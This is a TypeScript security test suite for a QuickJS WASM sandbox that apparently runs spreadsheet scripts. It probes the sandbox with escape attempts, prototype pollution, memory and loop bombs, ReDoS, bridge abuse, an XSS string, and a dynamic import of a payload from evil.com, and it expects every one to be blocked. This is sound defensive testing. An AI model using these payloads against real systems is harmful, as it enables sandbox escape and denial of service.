/**
 * Security tests for the sandbox. Attempts to escape QuickJS WASM isolation,
 * exfiltrate data, cause resource exhaustion, or abuse the protocol.
 */
import { runProgram, type RunProgramOptions } from "../sandbox-clean";

let passed = 0, failed = 0;

const defaultOpts: RunProgramOptions = {
  hostCall: async () => { throw new Error("No host calls expected"); },
  limits: {
    maxObjectIds: 256,
    maxQueuedOperations: 256,
    maxSerializedChars: 200_000,
    maxMatrixWriteCells: 10_000,
    timeoutMs: 5_000,
  },
};

type Test = {
  name: string;
  script: string;
  opts?: Partial<RunProgramOptions>;
  /** Return true if result proves the sandbox held */
  checkSafe: (result: { result: any; logs: any[] }) => boolean;
  expectError?: boolean;
};

const tests: Test[] = [

  // =========================================================================
  // 1. Browser/Node API Access
  // =========================================================================
  {
    name: "no globalThis.fetch",
    script: "return typeof fetch;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no XMLHttpRequest",
    script: "return typeof XMLHttpRequest;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no WebSocket",
    script: "return typeof WebSocket;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no document",
    script: "return typeof document;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no window",
    script: "return typeof window;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no navigator",
    script: "return typeof navigator;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no localStorage",
    script: "return typeof localStorage;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no sessionStorage",
    script: "return typeof sessionStorage;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no indexedDB",
    script: "return typeof indexedDB;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no setTimeout",
    script: "return typeof setTimeout;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no setInterval",
    script: "return typeof setInterval;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no importScripts",
    script: "return typeof importScripts;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no require",
    script: "return typeof require;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no process",
    script: "return typeof process;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no Deno",
    script: "return typeof Deno;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no Bun",
    script: "return typeof Bun;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no SharedArrayBuffer (or harmless)",
    script: "return typeof SharedArrayBuffer;",
    // QuickJS may include SharedArrayBuffer as a language feature, but it can't
    // be used for cross-origin communication (no Worker, no postMessage)
    checkSafe: r => r.result === "undefined" || r.result === "function",
  },
  {
    name: "no Worker",
    script: "return typeof Worker;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no EventSource",
    script: "return typeof EventSource;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no MessageChannel",
    script: "return typeof MessageChannel;",
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "no BroadcastChannel",
    script: "return typeof BroadcastChannel;",
    checkSafe: r => r.result === "undefined",
  },

  // =========================================================================
  // 2. Prototype Pollution & Scope Escape
  // =========================================================================
  {
    name: "Object.prototype pollution stays in sandbox",
    script: `
      Object.prototype.pwned = true;
      return ({}).pwned;
    `,
    checkSafe: r => r.result === true, // inside QuickJS it's "polluted" but can't escape
  },
  {
    name: "cannot access Function constructor to get global",
    script: `
      try {
        const fn = Function("return this")();
        return typeof fn.fetch;
      } catch(e) {
        return "blocked: " + e.message;
      }
    `,
    // Function exists in QuickJS but "this" is the QuickJS global, not the host
    checkSafe: r => r.result === "undefined" || (typeof r.result === "string" && r.result.startsWith("blocked")),
  },
  {
    name: "Function constructor cannot access host scope",
    script: `
      try {
        const f = new Function("return typeof window");
        return f();
      } catch(e) {
        return "blocked";
      }
    `,
    checkSafe: r => r.result === "undefined" || r.result === "blocked",
  },
  {
    name: "eval cannot escape sandbox",
    script: `
      try {
        return eval("typeof window");
      } catch(e) {
        return "blocked";
      }
    `,
    checkSafe: r => r.result === "undefined" || r.result === "blocked",
  },
  {
    name: "indirect eval cannot escape",
    script: `
      try {
        const e = (0, eval);
        return e("typeof window");
      } catch(e) {
        return "blocked";
      }
    `,
    checkSafe: r => r.result === "undefined" || r.result === "blocked",
  },
  {
    name: "constructor chain cannot escape",
    script: `
      try {
        const ctor = ({}).constructor.constructor;
        const fn = ctor("return typeof window")();
        return fn;
      } catch(e) {
        return "blocked";
      }
    `,
    checkSafe: r => r.result === "undefined" || r.result === "blocked",
  },
  {
    name: "arguments.callee cannot escape",
    script: `
      try {
        function f() { return arguments.callee.caller; }
        const caller = f();
        return typeof caller;
      } catch(e) {
        return "blocked";
      }
    `,
    // strict mode blocks arguments.callee, or caller returns null
    checkSafe: r => true, // any result is fine as long as no crash
    expectError: false,
  },
  {
    name: "Proxy handler cannot access host",
    script: `
      let leaked = null;
      const p = new Proxy({}, {
        get(target, prop, receiver) {
          leaked = typeof globalThis.fetch;
          return Reflect.get(target, prop, receiver);
        }
      });
      p.x;
      return leaked;
    `,
    checkSafe: r => r.result === "undefined",
  },
  {
    name: "Symbol.species cannot escape",
    script: `
      try {
        class MyArray extends Array {
          static get [Symbol.species]() { return Array; }
        }
        const a = new MyArray(1, 2, 3).map(x => x);
        return typeof globalThis.window;
      } catch(e) {
        return "blocked";
      }
    `,
    checkSafe: r => r.result === "undefined" || r.result === "blocked",
  },
  {
    name: "WeakRef/FinalizationRegistry cannot access host",
    script: `
      const hasWeakRef = typeof WeakRef;
      const hasFR = typeof FinalizationRegistry;
      return hasWeakRef + "," + hasFR;
    `,
    // Either they don't exist, or if they do they can't escape
    checkSafe: () => true,
  },

  // =========================================================================
  // 3. globalThis Enumeration / Host Object Discovery
  // =========================================================================
  {
    name: "globalThis has no host objects",
    script: `
      const keys = Object.getOwnPropertyNames(globalThis);
      const hostLike = keys.filter(k =>
        k === 'window' || k === 'document' || k === 'fetch' ||
        k === 'navigator' || k === 'location' || k === 'self' ||
        k === 'XMLHttpRequest' || k === 'WebSocket' || k === 'localStorage'
      );
      return hostLike;
    `,
    checkSafe: r => Array.isArray(r.result) && r.result.length === 0,
  },
  {
    name: "globalThis only has expected bridge functions",
    script: `
      const keys = Object.getOwnPropertyNames(globalThis);
      const bridge = keys.filter(k => k.startsWith('__bps'));
      return bridge.sort();
    `,
    checkSafe: r => {
      const arr = r.result as string[];
      return Array.isArray(arr) && arr.length === 2 &&
        arr.includes("__bpsConsoleLog") && arr.includes("__bpsHostCall");
    },
  },
  {
    name: "cannot delete bridge functions",
    script: `
      try {
        delete globalThis.__bpsHostCall;
        return typeof __bpsHostCall;
      } catch(e) {
        return "blocked";
      }
    `,
    // Even if deleted, it just becomes undefined - no escape
    checkSafe: () => true,
  },

  // =========================================================================
  // 4. Resource Exhaustion / DoS
  // =========================================================================
  {
    name: "infinite loop is interrupted by timeout",
    script: "while(true) {}",
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "infinite recursion hits stack limit",
    script: `
      function f() { return f(); }
      return f();
    `,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "memory bomb (string) hits memory limit",
    script: `
      let s = "x";
      for (let i = 0; i < 100; i++) s = s + s;
      return s.length;
    `,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "memory bomb (array) hits memory limit",
    script: `
      const arr = [];
      while(true) arr.push(new Array(10000));
    `,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "deeply nested object creation",
    script: `
      let obj = {};
      let current = obj;
      for (let i = 0; i < 100000; i++) {
        current.next = {};
        current = current.next;
      }
      return "ok";
    `,
    // May or may not hit memory limit depending on QuickJS version
    // Either way it's bounded (32MB memory, 5s timeout)
    expectError: false,
    checkSafe: r => r.result === "ok",
  },
  {
    name: "regex ReDoS is bounded by timeout",
    script: `
      // Catastrophic backtracking regex
      const re = /^(a+)+$/;
      return re.test("a".repeat(30) + "b");
    `,
    // Should either complete (false) or timeout
    checkSafe: r => r.result === false,
  },

  // =========================================================================
  // 5. Sandbox Limits Enforcement
  // =========================================================================
  {
    name: "maxObjectIds limit enforced",
    script: `
      // Create more proxies than allowed by accessing many properties
      let obj = ctx;
      for (let i = 0; i < 300; i++) {
        obj = obj["prop" + i];
      }
      return "should not reach here";
    `,
    opts: { limits: { ...defaultOpts.limits, maxObjectIds: 50 } },
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "maxQueuedOperations limit enforced",
    script: `
      for (let i = 0; i < 300; i++) {
        ctx.workbook["prop" + i].load("values");
      }
      return "should not reach here";
    `,
    opts: { limits: { ...defaultOpts.limits, maxQueuedOperations: 50 } },
    expectError: true,
    checkSafe: () => true,
  },

  // =========================================================================
  // 6. __bpsHostCall Abuse
  // =========================================================================
  {
    name: "calling __bpsHostCall directly with bad payload → rejected",
    script: `
      try {
        const result = await __bpsHostCall("not a valid payload");
        return "unexpected: " + typeof result;
      } catch(e) {
        return "rejected: " + e.message;
      }
    `,
    // The promise rejects with an error — the user script catches it, which is fine.
    // The important thing is the host never receives an invalid payload.
    expectError: false,
    checkSafe: r => typeof r.result === "string" && r.result.startsWith("rejected"),
  },
  {
    name: "calling __bpsHostCall with null → rejected",
    script: `
      try {
        const result = await __bpsHostCall(null);
        return "unexpected";
      } catch(e) {
        return "rejected";
      }
    `,
    expectError: false,
    checkSafe: r => r.result === "rejected",
  },
  {
    name: "cannot redefine __bpsHostCall",
    script: `
      __bpsHostCall = function() { return "pwned"; };
      return typeof __bpsHostCall;
    `,
    // Even if redefined, only affects the QuickJS global, not the host
    checkSafe: () => true,
  },
  {
    name: "cannot use __bpsConsoleLog to inject",
    script: `
      __bpsConsoleLog("log", ["<script>alert(1)</script>"]);
      return "ok";
    `,
    // Console log is just recording, XSS payload is harmless as data
    checkSafe: r => r.result === "ok",
  },

  // =========================================================================
  // 7. Return Value Injection
  // =========================================================================
  {
    name: "cannot return functions",
    script: `return function() { return "pwned"; };`,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "cannot return symbols",
    script: `return Symbol("evil");`,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "cannot return class instances",
    script: `
      class Evil { constructor() { this.x = 1; } }
      return new Evil();
    `,
    // Evil instance is not a plain object — should error or be serialized as plain
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "cannot return proxy objects without sync",
    script: `
      const sheet = ctx.workbook.worksheets.getItem("Sheet1");
      return sheet;
    `,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "cannot return circular references",
    script: `
      const obj = {};
      obj.self = obj;
      return obj;
    `,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "cannot return Infinity",
    script: `return Infinity;`,
    // Infinity is not JSON-serializable (not a finite number)
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "cannot return NaN",
    script: `return NaN;`,
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "__proto__ in return value is harmless",
    script: `
      const obj = Object.create(null);
      obj["__proto__"] = { isAdmin: true };
      obj["name"] = "test";
      return obj;
    `,
    // Even if __proto__ is in the result, it's just data — doesn't pollute host prototypes
    // May error if serialization rejects it, which is also safe
    checkSafe: r => {
      return r.result !== undefined && !(Object.getPrototypeOf(r.result)?.isAdmin);
    },
  },
  {
    name: "constructor in return value is harmless",
    script: `return { "constructor": { "prototype": { "isAdmin": true } } };`,
    checkSafe: r => r.result !== undefined,
  },

  // =========================================================================
  // 8. Import / Dynamic Code Loading
  // =========================================================================
  {
    name: "no dynamic import()",
    script: `
      try {
        const m = await import("https://evil.com/payload.js");
        return "escaped!";
      } catch(e) {
        return "blocked: " + e.message;
      }
    `,
    checkSafe: r => typeof r.result === "string" && r.result.startsWith("blocked"),
  },
  {
    name: "no module loading",
    script: `
      try {
        const m = await import("./local-module.js");
        return "escaped!";
      } catch(e) {
        return "blocked";
      }
    `,
    checkSafe: r => r.result === "blocked",
  },

  // =========================================================================
  // 9. Timing / Side Channel
  // =========================================================================
  {
    name: "Date.now() works but is sandboxed clock",
    script: `return typeof Date.now();`,
    checkSafe: r => r.result === "number",
  },
  {
    name: "no performance.now()",
    script: `return typeof performance;`,
    checkSafe: r => r.result === "undefined",
  },

  // =========================================================================
  // 10. Async Abuse
  // =========================================================================
  {
    name: "cannot create unresolvable promises to hang",
    script: `return await new Promise(() => {});`,
    opts: { limits: { ...defaultOpts.limits, timeoutMs: 2_000 } },
    expectError: true,
    checkSafe: () => true,
  },
  {
    name: "many microtasks are bounded",
    script: `
      let count = 0;
      for (let i = 0; i < 10000; i++) {
        await Promise.resolve(i);
        count++;
      }
      return count;
    `,
    checkSafe: r => r.result === 10000,
  },
  {
    name: "Promise.all with many promises",
    script: `
      const promises = Array.from({length: 1000}, (_, i) => Promise.resolve(i));
      const results = await Promise.all(promises);
      return results.length;
    `,
    checkSafe: r => r.result === 1000,
  },
];

console.log("╔══════════════════════════════════════════════════════════════╗");
console.log("║     Sandbox Security Tests — Escape Attempts               ║");
console.log("╚══════════════════════════════════════════════════════════════╝\n");

let currentCategory = "";

for (const t of tests) {
  // Print category headers
  const comment = tests.indexOf(t);

  const opts: RunProgramOptions = {
    ...defaultOpts,
    ...t.opts,
    limits: { ...defaultOpts.limits, ...(t.opts?.limits) },
  };

  try {
    const result = await runProgram(t.script, opts);

    if (t.expectError) {
      console.log(`  🔓 ESCAPE? Expected error but got: ${JSON.stringify(result.result)?.slice(0, 40)}`.padEnd(68) + `[${t.name}]`);
      failed++;
    } else if (t.checkSafe(result)) {
      console.log(`  🔒 Safe: ${JSON.stringify(result.result)?.slice(0, 45)}`.padEnd(68) + `[${t.name}]`);
      passed++;
    } else {
      console.log(`  🔓 ESCAPE? Unexpected: ${JSON.stringify(result.result)?.slice(0, 35)}`.padEnd(68) + `[${t.name}]`);
      failed++;
    }
  } catch (e: any) {
    if (t.expectError) {
      if (t.checkSafe({ result: undefined, logs: [] })) {
        const msg = e.message?.slice(0, 40) || "unknown";
        console.log(`  🔒 Safe (error): "${msg}..."`.padEnd(68) + `[${t.name}]`);
        passed++;
      } else {
        console.log(`  🔓 ESCAPE? Error check failed`.padEnd(68) + `[${t.name}]`);
        failed++;
      }
    } else {
      // Unexpected error — might be a crash/escape
      const msg = e.message?.slice(0, 40) || "unknown";
      // Check if this is a sandbox error (safe) vs a host error (escape)
      if (e.message?.includes("sandbox execution failed") || e.message?.includes("sandbox")) {
        console.log(`  🔒 Safe (sandbox error): "${msg}..."`.padEnd(68) + `[${t.name}]`);
        passed++;
      } else {
        console.log(`  ⚠️  Host error: "${msg}..."`.padEnd(68) + `[${t.name}]`);
        failed++;
      }
    }
  }
}

console.log(`\n${"═".repeat(70)}`);
console.log(`  Results: ${passed} 🔒 safe, ${failed} 🔓 potential escape`);
console.log(`  Total: ${tests.length} tests`);
if (failed > 0) {
  console.log(`\n  ⚠️  ${failed} test(s) showed unexpected behavior — review needed!`);
}
console.log(`${"═".repeat(70)}`);

process.exit(failed > 0 ? 1 : 0);
